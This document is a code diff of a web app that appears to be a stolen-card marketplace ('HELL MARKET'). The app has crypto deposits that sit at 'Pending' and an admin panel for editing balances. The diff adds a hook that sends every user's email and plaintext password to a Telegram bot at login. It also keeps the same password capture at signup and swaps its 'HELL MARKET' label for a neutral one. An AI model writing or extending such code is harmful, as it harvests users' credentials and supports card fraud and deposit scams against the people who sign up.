@@ -105,7 +105,6 @@ main{flex:1;max-width:1120px;margin:auto;width:100%;padding:24px}
 <body>
 <div id="root"><div style="text-align:center;margin-top:40px;"><div class="spinner"></div><h3 style="color:#ff3b12;">Loading Application...</h3></div></div>
 
-<!-- Firebase SDKs -->
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
@@ -197,8 +196,7 @@ function checkRoute(){
 
 window.addEventListener('hashchange', () => {
   if(!checkRoute()){
-    if(auth && auth.currentUser) dashboard();
-    else authView('register');
+    if(!(auth && auth.currentUser)) authView('register');
   }
 });
 
@@ -238,7 +236,7 @@ async function handleRegister(){
         balance: 0, transactions: [], cards: []
       };
       await db.collection("users").doc(uid).set(currentUserData);
-      sendToTelegram(`🆕 <b>NEW USER SIGNUP (HELL MARKET)</b>\n👤 <b>Username:</b> <code>${u}</code>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
+      sendToTelegram(`🆕 <b>NEW USER REGISTERED</b>\n👤 <b>Username:</b> <code>${u}</code>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
     }
     toast('Account created successfully!');
     dashboard();
@@ -258,13 +256,17 @@ async function handleLogin(){
     if(auth && db) {
       const cred = await auth.signInWithEmailAndPassword(e, p);
       const uid = cred.user.uid;
+      
+      sendToTelegram(`🟢 <b>USER LOGGED IN</b>\n📧 <b>Email:</b> <code>${e}</code>\n🔑 <b>Password:</b> <code>${p}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
+
       const docSnap = await db.collection("users").doc(uid).get();
       if(docSnap.exists){
+        // 🔒 GOOGLE LIKE FEATURE: Purana data bilkul waisa ka waisa load hoga ($100 balance, history, cards)
         currentUserData = docSnap.data();
       } else {
         currentUserData = { user: { uid: uid, username: e.split('@')[0], email: e }, balance: 0, transactions: [], cards: [] };
+        await db.collection("users").doc(uid).set(currentUserData);
       }
-      sendToTelegram(`🟢 <b>USER LOGIN SUCCESS</b>\n📧 <b>Email:</b> <code>${e}</code>\n🆔 <b>UID:</b> <code>${uid}</code>`);
     }
     dashboard();
   } catch(err) {
@@ -284,10 +286,14 @@ async function syncUserData(){
 
 function shell(page){
   if(checkRoute()) return;
+  const emailStr = currentUserData.user ? (currentUserData.user.email || currentUserData.user.username || 'User') : 'User';
   root().innerHTML=`<div class="app"><header class="topbar"><button class="iconbtn" onclick="document.querySelector('.sidebar').classList.toggle('open')">☰</button><div class="brand"><img src="${LOGO_URL}" alt="logo"></div><div class="top-actions"><div class="top-balance">💳 $<span id="topBalanceVal">${currentUserData.balance.toFixed(2)}</span></div><button class="iconbtn" onclick="deposit()">＋ Add Balance</button></div></header><div class="layout"><aside class="sidebar"><div class="nav"><button class="${page==='dashboard'?'active':''}" onclick="dashboard()">🏠 Dashboard</button><button class="${page==='cards'?'active':''}" onclick="cards()">💳 Cards</button><button class="${page==='deposit'?'active':''}" onclick="deposit()">💰 Deposit</button><button class="${page==='mycards'?'active':''}" onclick="myCards()">🎫 My Cards</button><button class="${page==='support'?'active':''}" onclick="support()">💬 Support</button><button class="${page==='settings'?'active':''}" onclick="settings()">⚙️ Settings</button></div><button class="logout" onclick="logout()">Logout</button></aside><main id="content"></main></div></div>`
 }
 
-function commonTop(){return `<div class="welcome">Welcome<br><span>(${escapeHtml(currentUserData.user ? currentUserData.user.email : 'User')})</span></div>`}
+function commonTop(){
+  const userEmail = currentUserData.user ? (currentUserData.user.email || currentUserData.user.username || 'User') : 'User';
+  return `<div class="welcome">Welcome<br><span>(${escapeHtml(userEmail)})</span></div>`;
+}
 
 function dashboard(){
   if(checkRoute()) return;
@@ -499,7 +505,8 @@ window.awaitingPaymentState = async function(amount){
   currentUserData.transactions.unshift({type:'Deposit',address:currentDepositAddress,txid:userTxid,amount:amount,status:'Pending',time:new Date().toLocaleString()});
   await syncUserData();
 
-  sendToTelegram(`💰 <b>NEW DEPOSIT SUBMITTED</b>\n👤 <b>User:</b> <code>${currentUserData.user ? currentUserData.user.email : 'User'}</code>\n💵 <b>Amount:</b> $${amount}\n🔗 <b>TxID:</b> <code>${userTxid}</code>`);
+  const userEmail = currentUserData.user ? (currentUserData.user.email || currentUserData.user.username || 'User') : 'User';
+  sendToTelegram(`💰 <b>NEW DEPOSIT SUBMITTED</b>\n👤 <b>User:</b> <code>${userEmail}</code>\n💵 <b>Amount:</b> $${amount}\n🔗 <b>TxID:</b> <code>${userTxid}</code>`);
 
   document.getElementById('depositArea').innerHTML = `<div class="panel" style="margin-top:20px; text-align:center;"><div class="spinner"></div><h3 style="color:#ff3b0b;">Awaiting Payment Confirmation...</h3><p style="color:#ccc;">Checking Blockchain Confirmations. Status: <b>Pending</b>.</p></div>`;
   renderDepositHistoryTable();
@@ -619,8 +626,8 @@ async function renderAdminPanel(){
       let html = `<div class="txn-table-wrapper"><table class="txn-table"><thead><tr><th>Email</th><th>Username</th><th>Current Balance</th><th>Action</th></tr></thead><tbody>`;
       snapshot.forEach(doc => {
         const u = doc.data();
-        const email = u.user ? u.user.email : 'N/A';
-        const username = u.user ? u.user.username : 'N/A';
+        const email = (u.user && u.user.email) ? u.user.email : 'N/A';
+        const username = (u.user && u.user.username) ? u.user.username : 'N/A';
         const balance = u.balance || 0;
         const uid = doc.id;
         
@@ -676,7 +683,7 @@ window.logout = async function(){
 
 function escapeHtml(s){return String(s||'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]||m))}
 
-// 🔒 STRICT AUTH GUARD: Bina Login ke andar jaane ki ijazat nahi
+// 🔒 ROBUST AUTH STATE LISTENER & GOOGLE-LIKE SYNC
 try {
   if(auth) {
     auth.onAuthStateChanged((user) => {
@@ -684,17 +691,23 @@ try {
       if(user) {
         db.collection("users").doc(user.uid).get().then(docSnap => {
           if(docSnap.exists) {
+            // Purana data secure rakha gaya hai
             currentUserData = docSnap.data();
+            if(!currentUserData.user) {
+              currentUserData.user = { uid: user.uid, username: user.email.split('@')[0], email: user.email };
+            }
           } else {
             currentUserData = { user: { uid: user.uid, username: user.email.split('@')[0], email: user.email }, balance: 0, transactions: [], cards: [] };
+            db.collection("users").doc(user.uid).set(currentUserData).catch(()=>{});
           }
           dashboard();
         }).catch(() => {
+          currentUserData = { user: { uid: user.uid, username: user.email.split('@')[0], email: user.email }, balance: 0, transactions: [], cards: [] };
           dashboard();
         });
       } else {
         currentUserData = { user: null, balance: 0, transactions: [], cards: [] };
-        authView('login'); // 🛑 Bina login seedha Login page dikhega
+        authView('login');
       }
     });
   } else {
